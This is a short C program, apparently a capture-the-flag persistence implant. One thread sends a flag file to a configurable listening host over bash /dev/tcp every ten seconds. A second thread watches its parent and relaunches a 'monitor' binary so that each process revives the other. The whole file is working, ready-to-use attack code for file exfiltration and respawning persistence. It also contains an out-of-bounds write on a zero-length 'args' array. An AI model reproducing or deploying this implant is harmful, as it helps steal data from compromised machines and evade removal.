/*run as child porcess, fork and monitor by farther process*/
/*two thread, one reverse flag to your listeng port, the other check farther process's staus*/
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <sys/wait.h>

/*examples, modify by yourself*/
char  *flag_path = "./flag";
char *ip = "127.0.0.1";
char *port = "10000";
char *father_process = "./monitor";
char *args[0] = {NULL};

void get_flag();
void check_father_state();

int main(int argc, char **argv){
	pthread_t thread1, thread2;
	int thrd1, thrd2;
	int i;
	
	args[0] = father_process;
	
	thrd1 = pthread_create(&thread1, NULL, (void *)&check_father_state, NULL);
	thrd2 = pthread_create(&thread2, NULL, (void *)&get_flag, NULL);

	if(thrd1 != 0 || thrd2 != 0)
	{
		fprintf(stderr, "thread create failed\n");
		exit(1);
	}

	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);

	return 0;
}

void check_father_state()
{
	pid_t ppid = getppid();

	while(getppid() == ppid)
		usleep(500);

	int ret = execve(father_process, args, NULL);
	if(ret < 0)
	{
		fprintf(stderr, "execve failed.\n");
		exit(1);
	}
	exit(0);
}

void get_flag()
{
	char command[128];
	snprintf(command, 128, "bash -c '/bin/cat %s >& /dev/tcp/%s/%s 0>&1'", flag_path, ip, port);
	while(1)
	{
		system(command);
		sleep(10);//one round time
	}
}